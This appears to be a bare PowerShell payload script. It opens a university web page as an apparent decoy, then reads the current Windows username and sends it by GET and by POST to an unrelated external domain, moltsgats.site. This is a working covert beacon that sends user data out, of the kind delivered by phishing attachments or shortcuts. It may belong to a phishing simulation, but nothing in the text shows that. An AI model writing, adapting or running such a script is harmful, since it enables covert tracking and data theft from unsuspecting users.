Start-Process "https://web.salleurl.edu/ph/"
#
$username = $env:USERNAME
#
$getUrl = "https://moltsgats.site/sendsal2025?$username"
Invoke-RestMethod -Uri $getUrl -Method Get
#
$postUrl = "https://moltsgats.site/sendsal2025"
$jsonPayload = @{
    username = $username
} | ConvertTo-Json
Invoke-RestMethod -Uri $postUrl -Method Post -Body $jsonPayload -ContentType "application/json"
